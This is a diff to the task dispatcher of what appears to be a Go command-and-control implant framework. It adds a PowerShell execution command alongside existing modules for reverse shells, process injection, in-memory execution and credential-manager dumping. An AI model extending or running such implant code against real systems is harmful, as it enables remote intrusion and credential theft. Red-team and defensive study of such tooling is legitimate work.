@@ -44,6 +44,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/execution/enumrwxmemory"
 	"github.com/latortuga71/GoC2/internal/modules/execution/loadlibrary"
 	"github.com/latortuga71/GoC2/internal/modules/execution/memfdcreate"
+	"github.com/latortuga71/GoC2/internal/modules/execution/powershell"
 	"github.com/latortuga71/GoC2/internal/modules/execution/processinjection"
 	"github.com/latortuga71/GoC2/internal/modules/execution/reverseshell"
 	"github.com/latortuga71/GoC2/internal/modules/execution/runbinary"
@@ -352,7 +353,7 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "memfd_create":
 		result, cmdError = memfdcreate.MemfdCreate(t.File, t.Args[0])
 	case "shell":
-		result, cmdError = basic.ShellCommand(t.Args[0])
+		result, cmdError = basic.ShellCommand(t.Args)
 	case "dump-credential-mgr":
 		result, cmdError = dumpcredman.DumpCredman(t.Args[0])
 	case "enum-drivers":
@@ -390,6 +391,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = addusertogroup.RemoveUser(t.Args)
 	case "enum-logons":
 		result, cmdError = enumlogons.EnumLogons()
+	case "powershell":
+		result, cmdError = powershell.RunPwsh(t.Args)
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
